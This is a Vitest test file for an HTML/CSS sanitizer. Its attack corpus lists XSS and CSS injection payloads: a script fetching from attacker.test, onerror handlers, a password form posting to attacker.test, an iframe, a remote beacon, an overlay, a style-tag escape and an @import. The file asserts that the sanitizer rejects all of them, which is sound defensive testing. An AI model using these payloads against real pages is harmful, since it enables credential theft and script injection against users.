import { describe, expect, it } from "vitest";
import { sanitizeDecorativeRegion } from "@buildmates/surfaces";

describe("generated surface attack corpus", () => {
  it.each([
    ["script", "<script>fetch('https://attacker.test')</script>", ".x{color:#222}"],
    ["event handler", "<img src=x onerror=alert(1)>", ".x{color:#222}"],
    ["credential form", "<form action='https://attacker.test'><input name=password></form>", ".x{color:#222}"],
    ["nested frame", "<iframe src='https://attacker.test'></iframe>", ".x{color:#222}"],
    ["remote beacon", "<p>safe</p>", ".x{background:url(https://attacker.test/pixel)}"],
    ["overlay", "<p>safe</p>", ".x{position:fixed;inset:0;z-index:999999}"],
    ["style escape", "<p>safe</p>", ".x{color:red}</style><img src=x onerror=alert(1)>"],
    ["import", "<p>safe</p>", "@import 'https://attacker.test/x.css';"],
  ])("rejects %s", (_label, html, css) => {
    expect(() => sanitizeDecorativeRegion({ id: "attack", label: "Attack", html, css })).toThrow(/unsafe/);
  });

  it("scopes passive CSS and emits an inert srcdoc policy", () => {
    const result = sanitizeDecorativeRegion({ id: "field-note", label: "Field note", html: "<section class='note'><p>Safe note</p></section>", css: ".note{color:#222;padding:1rem}" });
    expect(result.css).toContain('[data-surface-region="field-note"] .note');
    expect(result.srcDoc).toContain("default-src 'none'");
    expect(result.srcDoc).toContain("form-action 'none'");
    expect(result.srcDoc).not.toContain("allow-scripts");
  });

  it("rejects oversized CSS before scoping", () => {
    expect(() => sanitizeDecorativeRegion({ id: "attack", label: "Attack", html: "<p>Safe</p>", css: `.x{color:red}${" ".repeat(21_000)}` })).toThrow(/too_large/);
  });
});
